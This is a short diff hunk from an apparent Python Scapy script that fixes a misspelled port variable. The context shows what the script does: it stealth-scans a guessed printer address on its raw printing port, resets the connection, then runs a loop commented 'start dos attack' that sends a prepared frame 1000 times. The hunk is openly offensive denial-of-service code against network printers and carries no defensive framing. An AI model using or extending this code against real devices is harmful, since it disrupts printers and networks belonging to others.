@@ -21,7 +21,7 @@ while True:
 
 	if(stealth_scan_hp.getlayer(TCP).flags == 0x12): #0x12 -> syn ack -> the port is open
 	#send reset to complete the scan
-		send_rst = sr(IP(dst=printer_possible_ip)/TCP(dport=aw_printing_port,flags='R'),timeout=10)
+		send_rst = sr(IP(dst=printer_possible_ip)/TCP(dport=raw_printing_port,flags='R'),timeout=10)
 	#start dos attack
 		for i in range(1000):		
 			sendp(frames[0])
